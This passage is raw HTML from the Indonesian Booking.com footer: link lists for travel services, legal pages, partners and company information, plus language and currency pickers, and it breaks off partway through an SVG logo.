href="https://www.booking.com/articles.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Artikel travel</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://business.booking.com/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Booking.com untuk Bisnis</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/traveller-awards/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Traveller Review Awards</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/cars/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Rental Mobil</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://booking.com/pxgo?token=UmFuZG9tSVYkc2RlIyh9YY_oTPIGnIwxsTOANoogQKG3E8oWKY6n4Kozwd2FMK6FHR5OWqzyt4D9Pc2cYyI17IAuG521lFvr3INDNLhTJDNDXIjePV3yD9D7A_tP0Y44oKAj3NpyKSr0q4kizwTmrG1FxWC6MxKAO46wLC4WbePQRf4zTmQXDGLertyUN4GupDxESXunf5sY6RN4pXtSdVaGghcudpwRW63lmgVFW7pAF2HFj-6SwG4RaP3y0WL1pKd4WZduyxALPK9b8cyVCraoMV2veADF8QWkwdqhsYL25QF7w4PlFBgNRfFD3QkoqxwCuSrYgGHlhi-LEGtN6C-l_UFX-d6Yc4FdKnW4p-R_Alt1nDAtfENdnee5L-1OUUXf-GFLt3Y85Y6mcpKVJEvalp8GtZCfzgAfTcF84acDeARmB8tYq6FOw4SrLQ7ZAq3fXTaouBv_fptsr_zx6OzlhcovlH440sfj7HtTgybOQ21nVKNMH2E73x-mkvi387ByzABHj52rI8bzcWyB7j6fcjfp3fQdpWNglSkF3EK8PaBd7FHvItQZRzc5dfJyaee87VHZkLHJkMcUHaXaQrl2pZjoajamQKL68rjLoIYrGDaLLrEY1g&amp;url=https%3A%2F%2Fbooking.kayak.com%2Fin%3Fsid%3D763c41d2c3813906f2527013f103b837%26mc%3DIDR%26bdclc%3Did%26p%3Dfooter_link%26a%3Dbdc%252Ffooter_link&amp;aid=356980&amp;lang=id&amp;label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Pencari tiket pesawat</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.opentable.com/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980&amp;ref=16087" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Reservasi restoran</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/affiliate-program/v2/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980&amp;utm_campaign=booking-footer&amp;utm_content=travel-agents-link&amp;utm_medium=referral&amp;utm_source=booking.com" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Booking.com untuk Agen Perjalanan</span></span></a></div></li></ul></div><div data-testid="footer-group_legalAndSettings" style="--bui_stack_spaced_gap--s:3" class="f6e3a11b0d ae5dbab14d e95943ce9b TravellerFooter_footer-lists--list"><div class="ecb8d66605"><h3 class="b08850ce41 f546354b44 cc045b173b">Ketentuan dan pengaturan</h3></div><ul class="e9f7361569 b049f18dec"><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/content/privacy.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Privasi &amp; cookie</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/content/terms.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Persyaratan Layanan</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/content/accessibility_statement.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Pernyataan Aksesibilitas</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://secure.booking.com/content/complaints.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Masalah mitra</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.bookingholdings.com/modern-slavery-statement/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Pernyataan Perbudakan Modern</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.bookingholdings.com/about/compliance-and-ethics/human-rights/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Pernyataan Hak Asasi Manusia</span></span></a></div></li></ul></div><div data-testid="footer-group_partners" style="--bui_stack_spaced_gap--s:3" class="f6e3a11b0d ae5dbab14d e95943ce9b TravellerFooter_footer-lists--list"><div class="ecb8d66605"><h3 class="b08850ce41 f546354b44 cc045b173b">Mitra</h3></div><ul class="e9f7361569 b049f18dec"><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://admin.booking.com/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980&amp;utm_campaign=login_footer_v0&amp;utm_medium=frontend&amp;utm_source=extranet_login_footer" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Login ke Ekstranet</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://partner.booking.com/id?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980&amp;utm_campaign=footer_list&amp;utm_medium=frontend_footer&amp;utm_source=booking.com" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Bantuan mitra</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://join.booking.com/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980&amp;lang=id&amp;utm_medium=frontend&amp;utm_source=footer_menu" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Daftarkan properti Anda</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/affiliate-program/v2/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980&amp;utm_campaign=booking-footer&amp;utm_content=become-an-affiliate-link&amp;utm_medium=referral&amp;utm_source=booking.com" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Jadilah mitra afiliasi kami</span></span></a></div></li></ul></div><div data-testid="footer-group_about" style="--bui_stack_spaced_gap--s:3" class="f6e3a11b0d ae5dbab14d e95943ce9b TravellerFooter_footer-lists--list"><div class="ecb8d66605"><h3 class="b08850ce41 f546354b44 cc045b173b">Tentang Kami</h3></div><ul class="e9f7361569 b049f18dec"><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/content/about.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Tentang Booking.com</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/content/how_we_work.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Cara kerja kami</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.sustainability.booking.com/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Keberlanjutan</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://news.booking.com/id-id?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Pusat pers</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://careers.booking.com/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Karier</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.bookingholdings.com/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Relasi investor</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/content/contact-us.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Kontak perusahaan</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/content-moderation-policy/overview-page.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Pedoman konten dan pelaporannya</span></span></a></div></li></ul></div></div></div><div style="--bui_mixin_spaced_padding-block-end--s:4" class="b7ef425131 TravellerFooter_footer-control-section b5f4517f4e"><div style="--bui_stack_spaced_gap--s:4" class="f6e3a11b0d ae5dbab14d e95943ce9b"><div style="--bui_stack_spaced_gap--s:3" class="f6e3a11b0d a19a26a18c a81870d302 d38ad692ea e95943ce9b TravellerFooter_full-footer-pickers"><span class="a297f43545"><button aria-haspopup="dialog" data-testid="footer-language-picker-trigger-desktop" aria-label="Bahasa: Bahasa Indonesia" type="button" class="de576f5064 b46cd7aad7 e26a59bb37 dda427e6b5 acb3638563"><span class="ca2ca5203b"><div style="--bui_box_spaced_padding--s:0" class="c3bdfd4ac2 b96c49a28c c256f1a28a a18a170653 c82b1db4f9 ba98511f54"><picture class="b7a691c583 f5c8371996" style="--bui_image_width--s:100%;--bui_image_height--s:100%"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://t-cf.bstatic.com/design-assets/assets/v3.160.0/images-flags/Id@3x.png" alt="" role="presentation" loading="lazy"/></picture></div></span></button></span><span class="a297f43545"><button aria-haspopup="dialog" data-testid="footer-currency-picker-trigger-desktop" aria-label="Harga dalam Rupiah Indonesia" type="button" class="de576f5064 b46cd7aad7 e26a59bb37 dda427e6b5 acb3638563"><span class="ca2ca5203b">IDR</span></button></span></div><hr class="f5a887a489 cca4521350" aria-hidden="true"/><div style="--bui_stack_spaced_gap--s:0" class="f6e3a11b0d ae5dbab14d a81870d302 e95943ce9b"><div class="fff1944c52 fb14de7f14 fab9d44163"><div>Booking.com merupakan bagian dari Booking Holdings Inc., perusahaan terkemuka di dunia untuk perjalanan online dan layanan terkait lainnya.</div><div></div></div><div class="fff1944c52 fb14de7f14 fab9d44163">Hak cipta © 1996–2025 Booking.com™. Semua hak dilindungi.</div></div><div style="--bui_stack_spaced_gap--s:8" class="f6e3a11b0d a19a26a18c ff07c65a27 e95943ce9b"><span role="img" class="fc70cba028 ca6ff50764" aria-label="Booking.com"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 180 30"><path fill="#003B95" d="M70.6 2.73999C70.602 2.19808 70.7646 1.66892 71.0673 1.21943C71.3701 0.769947 71.7993 0.420321 72.3007 0.214768C72.8021 0.00921437 73.3532 -0.0430342 73.8843 0.064629C74.4155 0.172292 74.9027 0.435032 75.2845 0.819622C75.6663 1.20421 75.9255 1.69338 76.0293 2.22527C76.133 2.75716 76.0768 3.30788 75.8676 3.80779C75.6584 4.3077 75.3056 4.73434 74.8539 5.03377C74.4022 5.3332 73.8719 5.49197 73.33 5.48999C72.9702 5.48868 72.6141 5.41651 72.2822 5.2776C71.9503 5.13869 71.649 4.93576 71.3955 4.6804C71.1419 4.42504 70.9412 4.12225 70.8047 3.78931C70.6683 3.45637 70.5987 3.09982 70.6 2.73999V2.73999ZM116.5 23.74C117.044 23.742 117.577 23.5824 118.031 23.2814C118.484 22.9804 118.838 22.5516 119.048 22.0493C119.257 21.547 119.313 20.9938 119.208 20.4597C119.103 19.9255 118.842 19.4346 118.458 19.049C118.074 18.6634 117.584 18.4005 117.05 18.2936C116.516 18.1867 115.963 18.2405 115.46 18.4484C114.957 18.6562 114.527 19.0087 114.224 19.4611C113.922 19.9136 113.76 20.4457 113.76 20.99C113.756 21.3528 113.824 21.7128 113.96 22.0493C114.096 22.3857 114.297 22.692 114.551 22.9504C114.806 23.2088 115.109 23.4143 115.444 23.5549C115.778 23.6956 116.137 23.7687 116.5 23.77V23.74ZM34.34 15.25C34.3539 16.9569 33.8606 18.6295 32.9228 20.0558C31.985 21.4821 30.6448 22.5979 29.0721 23.2616C27.4995 23.9254 25.7651 24.1072 24.089 23.7842C22.4128 23.4612 20.8703 22.6477 19.657 21.4471C18.4437 20.2464 17.6142 18.7125 17.2736 17.0398C16.933 15.3671 17.0967 13.631 17.744 12.0515C18.3912 10.472 19.4929 9.12017 20.9093 8.16745C22.3257 7.21474 23.993 6.70401 25.7 6.69999C26.8418 6.65398 27.9809 6.84396 29.046 7.25808C30.1111 7.67219 31.0793 8.30152 31.8902 9.10676C32.701 9.91199 33.3371 10.8758 33.7586 11.938C34.1801 13.0002 34.3781 14.1379 34.34 15.28V15.25ZM29.73 15.25C29.73 12.57 28.07 10.7 25.73 10.7C23.39 10.7 21.73 12.57 21.73 15.25C21.73 17.93 23.37 19.8 25.73 19.8C28.09 19.8 29.73 17.97 29.73 15.28V15.25ZM65.3 15.68C65.1321 15.3416 64.9128 15.0313 64.65 14.76L64.5 14.6L64.66 14.45C64.9116 14.1778 65.1423 13.887 65.35 13.58L69.74 7.02999H64.41L61.1 12.16C60.9586 12.3142 60.782 12.4321 60.5852 12.5034C60.3885 12.5748 60.1774 12.5977 59.97 12.57H59.22V2.90999C59.22 0.979993 58.01 0.709993 56.71 0.709993H54.48V23.58H59.21V16.72H59.65C60.19 16.72 60.56 16.78 60.73 17.08L63.35 21.97C63.5773 22.5089 63.9785 22.9563 64.4895 23.2408C65.0006 23.5253 65.5922 23.6306 66.17 23.54H69.8L67.09 19.07L65.3 15.68ZM88.3 6.67999C87.4047 6.66014 86.5151 6.82782 85.6884 7.17226C84.8618 7.5167 84.1163 8.03028 83.5 8.67999L83.21 8.96999L83.11 8.56999C82.9561 8.07803 82.6321 7.65692 82.196 7.38207C81.7599 7.10723 81.2402 6.9966 80.73 7.06999H78.6V23.57H83.32V15.97C83.305 15.2919 83.403 14.6159 83.61 13.97C83.8279 13.1302 84.3223 12.3883 85.0136 11.8639C85.7048 11.3396 86.5525 11.0634 87.42 11.08C88.88 11.08 89.42 11.85 89.42 13.86V21.05C89.365 21.3921 89.3919 21.7424 89.4986 22.072C89.6053 22.4017 89.7886 22.7013 90.0336 22.9463C90.2787 23.1914 90.5783 23.3747 90.908 23.4814C91.2376 23.5881 91.5879 23.615 91.93 23.56H94.15V13.07C94.15 8.89999 92.12 6.68999 88.27 6.68999L88.3 6.67999ZM73.42 7.04999H71.2V23.58H75.9V9.57999C75.9545 9.23754 75.9274 8.88705 75.8207 8.55711C75.714 8.22717 75.5308 7.92712 75.2861 7.68143C75.0414 7.43574 74.7421 7.25138 74.4126 7.14339C74.083 7.03539 73.7327 7.00681 73.39 7.05999L73.42 7.04999ZM52.8 15.28C52.8158 16.9897 52.3235 18.6657 51.3853 20.0951C50.4472 21.5246 49.1055 22.6431 47.5307 23.3089C45.9558 23.9747 44.2186 24.1576 42.5396 23.8345C40.8606 23.5114 39.3154 22.6969 38.1001 21.4942C36.8847 20.2915 36.054 18.7549 35.7134 17.0794C35.3727 15.4038 35.5375 13.6649 36.1867 12.0831C36.8359 10.5013 37.9404 9.14808 39.36 8.19502C40.7795 7.24195 42.4502 6.73205 44.16 6.72999C45.2992 6.68421 46.4357 6.87336 47.4987 7.28565C48.5617 7.69795 49.5285 8.32457 50.3389 9.12655C51.1493 9.92853 51.786 10.8887 52.2094 11.9473C52.6328 13.0059 52.8338 14.1403 52.8 15.28V15.28ZM48.19 15.28C48.19 12.6 46.53 10.73 44.19 10.73C41.85 10.73 40.19 12.6 40.19 15.28C40.19 17.96 41.83 19.83 44.19 19.83C46.55 19.83 48.19 17.97 48.19 15.28V15.28ZM153.53 15.28C153.544 16.9869 153.051 18.6595 152.113 20.0858C151.175 21.5121 149.835 22.6279 148.262 23.2916C146.689 23.9554 144.955 24.1372 143.279 23.8142C141.603 23.4912 140.06 22.6777 138.847 21.4771C137.634 20.2764 136.804 18.7425 136.464 17.0698C136.123 15.3971 136.287 13.661 136.934 12.0815C137.581 10.502 138.683 9.15017 140.099 8.19745C141.516 7.24474 143.183 6.73401 144.89 6.72999C146.029 6.68421 147.166 6.87336 148.229 7.28565C149.292 7.69795 150.258 8.32457 151.069 9.12655C151.879 9.92853 152.516 10.8887 152.939 11.9473C153.363 13.0059 153.564 14.1403 153.53 15.28V15.28ZM148.92 15.28C148.92 12.6 147.26 10.73 144.92 10.73C142.58 10.73 140.92 12.6 140.92 15.28C140.92 17.96 142.56 19.83 144.92 19.83C147.28 19.83 148.92 17.97 148.92 15.28V15.28ZM111.92 7.01999V22.17C111.92 27.94 107.25 30 103.25 30C101.25 29.9851 99.2804 29.5022 97.5 28.59L97.17 28.42L98.08 26.14C98.1174 25.9257 98.2045 25.7232 98.3343 25.5487C98.4642 25.3743 98.6332 25.2327 98.8277 25.1354C99.0223 25.0382 99.2369 24.9879 99.4544 24.9887C99.6719 24.9895 99.8862 25.0413 100.08 25.14C101.092 25.5155 102.161 25.715 103.24 25.73C105.82 25.73 107.24 24.51 107.24 22.3V21.84L106.88 22.12C105.825 22.8661 104.551 23.2391 103.26 23.18C98.88 23.18 95.81 19.74 95.81 14.83C95.81 9.91999 98.81 6.59999 103.17 6.59999C104.741 6.53072 106.283 7.04344 107.5 8.03999L107.72 8.22999L107.84 7.97999C108.031 7.64497 108.315 7.37233 108.657 7.19491C109 7.01749 109.386 6.94285 109.77 6.97999L111.92 7.01999ZM107.32 14.91C107.32 11.23 105.32 10.81 103.83 10.81C100.83 10.81 100.6 13.81 100.6 14.81C100.6 16.91 101.52 19.16 104.08 19.16C105.54 19.11 107.3 18.38 107.3 14.91H107.32ZM15.77 16.84C15.77 20.84 12.67 23.5 7.88 23.5H0V3.09999C0.00471433 2.48223 0.247466 1.89007 0.677736 1.44677C1.10801 1.00346 1.69265 0.743142 2.31 0.719993H7.79C12.09 0.719993 14.88 3.03999 14.88 6.63999C14.9049 7.45565 14.7493 8.26672 14.4243 9.01525C14.0993 9.76377 